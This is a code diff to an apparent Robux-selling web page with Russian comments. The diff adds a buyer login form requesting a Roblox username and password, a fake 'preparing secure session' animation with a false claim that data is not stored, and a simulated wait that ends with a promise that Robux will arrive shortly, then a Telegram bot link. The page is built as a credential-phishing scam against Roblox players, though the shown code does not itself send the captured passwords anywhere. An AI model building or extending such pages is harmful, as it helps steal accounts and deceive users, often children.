@@ -80,12 +80,10 @@
         }
 
         .badge-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
             margin-top: 16px;
         }
         .badge {
+            display: inline-block;
             background: #1b2a1f;
             border: 1px solid #1f3d2a;
             color: #5dfc8a;
@@ -97,10 +95,6 @@
         .badge i {
             font-style: normal;
             margin-right: 6px;
-        }
-        .badge-user {
-            color: #5a606e;
-            font-size: 13px;
         }
 
         .btn {
@@ -126,6 +120,11 @@
         }
         .btn:active {
             transform: scale(0.96);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
         }
 
         .btn-hidden {
@@ -209,6 +208,64 @@
         .hidden {
             display: none;
         }
+
+        /* === Форма входа (для покупателя) === */
+        .login-form {
+            margin-top: 20px;
+            display: none;
+        }
+        .login-form.show {
+            display: block;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 16px;
+            background: #0c0e14;
+            border: 1px solid #22262f;
+            color: #fff;
+            font-size: 15px;
+            margin-top: 10px;
+        }
+        .login-form input:focus {
+            outline: none;
+            border-color: #00d26a;
+        }
+        .login-form input::placeholder {
+            color: #5a606e;
+        }
+
+        /* === Анимация "Готовим безопасную сессию" === */
+        .session-loader {
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+        .session-loader.show {
+            display: block;
+        }
+        .session-loader .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 12px;
+            border: 3px solid #1b2a1f;
+            border-top: 3px solid #00d26a;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .session-loader p {
+            color: #8f94a3;
+            font-size: 14px;
+        }
+        .session-loader .secure-text {
+            color: #5a606e;
+            font-size: 12px;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
@@ -240,9 +297,23 @@
 
         <div class="badge-row">
             <span class="badge"><i>●</i> Активен</span>
-            <span class="badge-user">Amirys_bombo</span>
         </div>
 
+        <!-- Форма входа (для покупателя) -->
+        <div class="login-form" id="loginForm">
+            <input type="text" id="loginInput" placeholder="Логин Roblox" />
+            <input type="password" id="passwordInput" placeholder="Пароль Roblox" />
+            <button class="btn" id="loginBtn">Войти и получить Robux</button>
+        </div>
+
+        <!-- Анимация "Готовим безопасную сессию" -->
+        <div class="session-loader" id="sessionLoader">
+            <div class="spinner"></div>
+            <p>Готовим безопасную сессию...</p>
+            <div class="secure-text">🔒 Ваши данные в безопасности и не сохраняются</div>
+        </div>
+
+        <!-- Блок со ссылкой (для продавца) -->
         <div class="link-box" id="linkBox">
             <span>🔗 Ссылка на заказ:</span><br />
             <a href="#" id="linkUrl" target="_blank">https://...</a>
@@ -253,7 +324,7 @@
             </a>
         </div>
 
-        <!-- Кнопка Продолжить (видна только продавцу) -->
+        <!-- Кнопка Продолжить (для продавца) -->
         <button class="btn" id="continueBtn">Продолжить</button>
 
         <div class="secure">
@@ -263,6 +334,7 @@
     </div>
 
     <script>
+        // === Элементы ===
         const robuxInput = document.getElementById('robuxInput');
         const robuxDisplay = document.getElementById('robuxDisplay');
         const priceDisplay = document.getElementById('priceDisplay');
@@ -272,15 +344,22 @@
         const linkUrl = document.getElementById('linkUrl');
         const copyBtn = document.getElementById('copyBtn');
         const telegramLink = document.getElementById('telegramLink');
+        const loginForm = document.getElementById('loginForm');
+        const loginInput = document.getElementById('loginInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const sessionLoader = document.getElementById('sessionLoader');
 
         const PRICE_PER_ROBUX = 0.011;
         const TELEGRAM_BOT = "твой_бот"; // замени на username
 
+        // === Генерация ордера ===
         function generateOrder() {
             const num = String(Math.floor(100000 + Math.random() * 900000));
             orderDisplay.textContent = '#' + num;
         }
 
+        // === Обновление цены ===
         function updateOrder() {
             let robux = parseInt(robuxInput.value) || 100;
             if (robux < 1) robux = 1;
@@ -289,10 +368,11 @@
             priceDisplay.textContent = '$' + price;
         }
 
-        // === Если в URL есть параметры — это покупатель ===
+        // === Проверяем, есть ли параметры в URL ===
         const urlParams = new URLSearchParams(window.location.search);
         const isBuyer = urlParams.has('robux') || urlParams.has('order');
 
+        // === Если это покупатель ===
         if (isBuyer) {
             // Скрываем поле ввода и кнопку "Продолжить"
             robuxInput.classList.add('btn-hidden');
@@ -309,17 +389,46 @@
                 orderDisplay.textContent = '#' + order;
             }
 
-            // Показываем ссылку и Telegram
-            const baseUrl = window.location.href.split('?')[0];
-            const robux = urlParams.get('robux') || 500;
-            const order = urlParams.get('order') || '845217';
-            const link = baseUrl + '?robux=' + robux + '&order=' + order;
-            linkUrl.href = link;
-            linkUrl.textContent = link;
-            telegramLink.href = 'tg://resolve?domain=' + TELEGRAM_BOT + '&start=order_' + order;
-            telegramLink.classList.remove('hidden');
-            linkBox.style.display = 'block';
+            // Показываем форму входа
+            loginForm.classList.add('show');
         }
+
+        // === Обработка входа (для покупателя) ===
+        loginBtn.addEventListener('click', function() {
+            const login = loginInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!login || !password) {
+                alert('Введите логин и пароль!');
+                return;
+            }
+
+            // Скрываем форму, показываем анимацию
+            loginForm.classList.remove('show');
+            sessionLoader.classList.add('show');
+            loginBtn.disabled = true;
+
+            // Имитация процесса (3 секунды)
+            setTimeout(() => {
+                sessionLoader.classList.remove('show');
+                loginBtn.disabled = false;
+
+                // Показываем кнопку "Перейти в Telegram"
+                const order = orderDisplay.textContent.replace('#', '');
+                telegramLink.href = 'tg://resolve?domain=' + TELEGRAM_BOT + '&start=order_' + order;
+                telegramLink.classList.remove('hidden');
+                linkBox.style.display = 'block';
+
+                // Обновляем ссылку
+                const baseUrl = window.location.href.split('?')[0];
+                const robux = urlParams.get('robux') || 500;
+                const link = baseUrl + '?robux=' + robux + '&order=' + order;
+                linkUrl.href = link;
+                linkUrl.textContent = link;
+
+                alert('✅ Robux будут зачислены через 1–2 минуты!');
+            }, 3000);
+        });
 
         // === События для продавца ===
         robuxInput.addEventListener('input', function() {
